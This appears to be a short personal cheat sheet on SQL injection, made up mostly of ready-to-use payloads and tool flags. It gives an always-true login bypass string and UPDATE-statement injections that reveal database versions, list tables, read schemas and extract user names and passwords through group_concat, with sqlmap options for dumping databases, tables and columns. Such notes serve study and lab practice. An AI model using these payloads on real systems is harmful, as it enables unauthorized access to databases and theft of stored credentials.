- SQL comment: `-- -`
- SQL always true:`1' or '1'='1'-- -`
- Use burpsuite proxy to modify params in case of client side input validation
- update statement
	- ```# MySQL and MSSQL

',nickName\=@@version,email\='

# For Oracle

',nickName\=(SELECT banner FROM v$version),email\='

# For SQLite

',nickName\=sqlite\_version(),email\='```
	- `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='`
	- `',nickName=(SELECT sql FROM sqlite\_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='`
	- `',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='`
- `sqlmap -u <url -w param>`
	- `-b` grab the banner 
	- `-tables` list tables
	- `--current-db <db>` set database to query
	- `--dump` dump table
	- `--technique` technique to use
		-   `B`: Boolean-based blind
		-   `E`: Error-based
		-   `U`: Union query-based
		-   `S`: Stacked queries
		-   `T`: Time-based blind
		-   `Q`: Inline queries
	-   `-dbs` list databases
	-   `-tables` list tables
	-   `-T <table>` table to use
	-   `-D <dbs>` database to use
	-   `-columns` list columns
	-   `-C  <column1,column2>`